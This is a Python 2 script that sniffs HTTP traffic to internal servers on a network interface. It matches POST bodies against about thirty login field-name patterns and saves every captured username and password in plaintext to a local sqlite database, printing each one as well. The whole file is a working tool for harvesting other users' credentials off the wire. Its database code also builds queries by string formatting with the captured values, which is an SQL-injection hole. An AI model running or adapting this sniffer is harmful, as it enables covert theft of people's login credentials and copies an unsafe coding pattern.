# -*- coding:utf-8 -*-

import re
import os
import sys
import dpkt
import sqlite3
import pcap
import traceback

reload(sys)
sys.setdefaultencoding('utf-8')

lists=[('u=','&p='),
    ('txtUserId=','&txtPassword='),
    ('username=','&password='),
    ('F_LOGINNAME=','&F_PASSWORD='),
    ('account=','&password='),
    ('username=','&pwd='),
    ('userId=','&password='),
    ('UserName=','&PASSWORD='),
    ('txtName=','&txtPwd='),
    ('UserTxt=','&PsdTxt='),
    ('account=','&password='),
    ('dd=','&mm='),
    ('UserName=', '&Password='),
    ('userCode=', '&password='),
    ('j_username=', '&j_password='),
    ('login_name=', '&login_password='),
    ('NAME=', '&PAS='),
    ('txtUsername=', '&txtPassword='),
    ('UserNameTemp=', '&PassWordTemp='),
    ('UserName=', '&PassWord='),
    ('tbxUserName=','&tbxPassword='),
    ('userName=','&password='),
    ('id=','&password='),
    ('uid=','&pwd='),
    ('txtLoginName=','&txtPwd='),
    ('userName=','&pwd='),
    ('uname=','&pwd='),
    ('txtUserCode=','&txtPassword='),
    ('"userAccounts":',',"password":'),
    ('UserNameTextBox=','&PasswordTextBox='),
    ('txtAdminName=','&txtPassword='),
    ('uName=','&uPwd='),
    ('UserName=','&pwd='),
]


def insert_info(url,username,password):
    try:
        conn = sqlite3.connect('info.db', check_same_thread=False)
        conn.text_factory = str
        cursor = conn.cursor()
        cursor.execute(
            "CREATE TABLE IF NOT EXISTS  urls (id integer primary key autoincrement,date timestamp not null default (datetime('now','localtime')), login_url text, username text, password text)")

        sql_cmd = "select '%s' from urls where username = '%s' and  password='%s'" % (url,username,password)
        cursor.execute(sql_cmd)
        res = cursor.fetchall()
        if len(res) > 0 :
            pass
        else:
            sql_cmd_2 = "insert into urls(login_url,username,password) values('%s','%s','%s') " % (url,username,password)
            cursor.execute(sql_cmd_2)
        cursor.close()
        conn.commit()
        conn.close()
    except Exception as e:
        traceback.print_exc()


def get_inside_ip():
    iip=[]
    _file = os.path.abspath(os.path.dirname(__file__))+os.sep+'net.txt'
    with open(_file, "r")as f:
        for i in f.readlines():
            if i.startswith(" nat server protocol"):
                _inside = re.findall(r'inside(.*)$', i)
                inside = _inside[0].split()
                iip.append(inside[0])
    print 'total found %s records'% len(set(iip))
    return set(iip)


def get_filterstr():
    Targets=['dst host %s'% ip for ip in get_inside_ip()]
    return 'tcp and '+ ' or '.join(Targets)
    


def monitor():
    pcapng = pcap.pcap('eno2')
    pcapng.setfilter(get_filterstr())
    try:
        for timestamp, buf in pcapng:
            eth = dpkt.ethernet.Ethernet(buf)
            if eth.type != dpkt.ethernet.ETH_TYPE_IP:
                continue
            ip = eth.data
            if ip.p != dpkt.ip.IP_PROTO_TCP:
                continue
            tcp = ip.data
            try:
                request = dpkt.http.Request(tcp.data)
            except (dpkt.dpkt.NeedData, dpkt.dpkt.UnpackError):
                continue
            if request.headers.get('host','') and request.uri:               
                if request.method == 'POST':
                    data= request.body
                    for key,value in lists:
                        info=re.compile(r'%s(.*?)%s(.*?)($|&)'% (key,value))
                        result=info.match(data)
                        if result:
                            url = 'http://' + request.headers.get('host', '') + request.uri
                            insert_info(url, result.group(1), result.group(2))
                            print url,' '*(70-len(url)),result.group(1),'/',result.group(2)


    except Exception as e:
        traceback.print_exc()


if __name__=='__main__':
    monitor()
